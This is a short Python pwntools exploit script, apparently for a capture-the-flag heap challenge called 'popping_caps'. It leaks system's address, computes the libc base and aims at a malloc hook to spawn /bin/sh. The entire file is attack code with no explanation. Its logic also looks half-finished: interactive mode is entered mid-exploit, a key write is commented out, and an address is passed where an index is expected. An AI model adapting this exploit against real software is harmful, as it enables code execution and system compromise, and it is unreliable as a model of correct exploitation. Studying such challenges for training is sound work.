#!/usr/bin/env python
from pwn import *

p = process("./popping_caps")

def free(index):
    p.sendlineafter("choice:", str(2))
    p.sendlineafter("free:", str(index))

def malloc(length):
    p.sendlineafter("choice:", str(1))
    p.sendlineafter("many:", str(length))

def write(buf):
    p.sendlineafter("choice", str(3))
    p.sendlineafter("in:", buf)


def exploit():
    libc = ELF("./libc.so.6")

    system = int(p.recvline().split()[3], 16)
    libc_base = system - libc.symbols["system"]
    print(hex(libc_base))

    free_hook = libc_base + libc.symbols["__malloc_hook"]
    print(hex(free_hook))
    pause()
    free(free_hook)
    p.interactive()
    malloc(8)
    write(p64(0xffffffff))
#    write(p64(system))
    malloc(16)
    write("/bin/sh")
    free(0)

exploit()
